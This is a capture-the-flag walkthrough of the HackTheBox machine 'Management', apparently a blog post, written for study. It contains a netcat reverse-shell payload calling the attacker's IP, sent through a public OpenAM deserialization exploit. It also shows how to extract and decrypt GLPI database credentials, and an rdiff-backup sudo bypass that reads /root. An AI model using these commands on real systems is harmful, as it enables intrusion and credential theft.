---
title: "Management - HackTheBox Writeup"
date: 2026-09-25
categories: [ctf]
tags: [hackthebox, linux, openam, rce, deserialization, glpi, xchacha20, rdiff-backup]
---

Hey! Let's walk through **Management**, an Easy Linux machine on HackTheBox that features an OpenAM RCE vulnerability, database decryption of encrypted GLPI credentials, and a `rdiff-backup` sudo misconfiguration for privilege escalation.

---

## 1. Reconnaissance & Nmap Scan

To start, I added the target IP and domain mapping to my `/etc/hosts` file:

```bash
10.129.103.207   management.htb
```

Next, I ran an initial Nmap scan to discover open ports and running services:

```bash
nmap -p- -sC -sV --min-rate 10000 -T5 10.129.103.207
```

![Nmap scan results](/home/assets/img/management-1.jpg)

The scan revealed several open ports:
* **Port 22**: SSH (`OpenSSH 9.6p1`)
* **Port 80**: HTTP (`nginx 1.24.0`) redirecting to `https://management.htb/`
* **Port 443**: HTTPS (`nginx 1.24.0`) serving the "Management" IT & Infrastructure page and pointing to `sso.management.htb`
* **Port 1689 / 39501**: Java RMI
* **Port 4444**: SSL / krb524 (Administration Connector)
* **Port 50389**: LDAP (Anonymous bind OK)

![Management.htb homepage](/home/assets/img/management-2.png)

---

## 2. Enumeration & OpenAM RCE (CVE-2026-33439)

Directory fuzzing on `https://management.htb/` didn't find any hidden directories, but clicking the "Client login" button redirected me to `https://sso.management.htb/openam/XUI/#login/`.

After Inspecting the source code of the login page revealed the running software version: **OpenAM 16.0.5**.

![OpenAM login page source revealing v=16.0.5](/home/assets/img/management-3.png)

Then I have searched for the vulnerabilities for the OpenAM version 16.0.5 and I found **CVE-2026-33439** which is  pre-authentication Remote Code Execution vulnerability caused by unsafe Java deserialization via the `jato.clientSession` parameter.

![CVE-2026-33439 vulnerability details](/home/assets/img/management-4.png)

I found a public Python proof-of-concept exploit for this CVE : https://github.com/infernosalex/CVE-2026-33439-Python-PoC .

![CVE-2026-33439 Python PoC repository](/home/assets/img/management-5.png)

To exploit it, I started a Netcat listener on my local machine:

```bash
nc -lvnp 4444
```

Then, I ran the exploit script against the OpenAM password reset endpoint, passing a standard netcat reverse shell payload:

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.171 4444 >/tmp/f'
```

![Running the exploit script](/home/assets/img/management-6.png)

Instantly, my listener caught a connection, giving me a shell as the `openam` user.

![Reverse shell as openam user](/home/assets/img/management-7.jpg)


---

## 3. Lateral Movement to User `owen`

While exploring the system from the `openam` user context, I located the GLPI configuration files at `/opt/glpi/config`. Reading `config_db.php` exposed the MySQL database credentials:
* **Database User**: `glpi`
* **Database Password**: `8rhu0L6Pw4Y7`
* **Database Name**: `glpidb`

![Reading config_db.php for database credentials](/home/assets/img/management-8.png)

```php
public $dbhost = '127.0.0.1';
public $dbuser = 'glpi';
public $dbpassword = '8rhu0L6Pw4Y7';
public $dbdefault = 'glpidb';
```

I logged into MySQL to inspect the tables:

```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SHOW TABLES;"
```

Among the tables, `glpi_authldaps` looked promising. Querying it revealed an encrypted LDAP root DN password:

```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT * FROM glpi_authldaps;"
```
![Querying glpi_authldaps for the encrypted password](/home/assets/img/management-9.jpg)

* **Encrypted String**: `avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==`

After analyzing GLPI's encryption scheme, I found that GLPI 10.x uses **libsodium XChaCha20-Poly1305** to encrypt sensitive fields. The application's built-in `GLPIKey` class can decrypt this.

I wrote a quick one-liner PHP script utilizing GLPI's internal key management to decrypt the password:

```bash
php -r ' define("GLPI_CONFIG_DIR", "/opt/glpi/config"); require_once "vendor/autoload.php"; require_once "src/GLPIKey.php"; $key = new GLPIKey(); echo $key->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=="), PHP_EOL; '
```

![Decrypting the GLPI password](/home/assets/img/management-10.png)

This successfully decrypted the string into the plain-text password: **`WpczC40GhTbk`**.

Since the user `owen` existed on the system, I tested these credentials via SSH and logged in successfully:

```bash
ssh owen@management.htb
```

Once logged in, I grabbed the user flag:
* **User Flag**: `49080c1dbeaef21b2b0f19e0db7ede72`

---

## 4. Privilege Escalation to Root

Checking sudo privileges for user `owen` via `sudo -l` revealed a very interesting misconfiguration:

```bash
sudo -l
```

![sudo -l output showing rdiff-backup misconfiguration](/home/assets/img/management-11.png) 

The output showed that `owen` could run `rdiff-backup` as root without a password under strict path and mode restrictions:
```text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

Because `rdiff-backup` allows remote schema execution, I could leverage it to read arbitrary files from the system with root privileges by tricking it into treating the local system as a remote target.

I executed the following command to mirror the root directory into `/tmp/root_backup`:

```bash
rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" backup /::/root /tmp/root_backup
```

Navigating into the backup folder, I was able to read `root.txt` directly:

```bash
cd /tmp/root_backup/
cat root.txt
```

![Root shell via rdiff-backup and reading root.txt](/home/assets/img/management-12.jpg)


* **Root Flag**: `33946f4ab402fa3c3ecf155a4b3985d4`
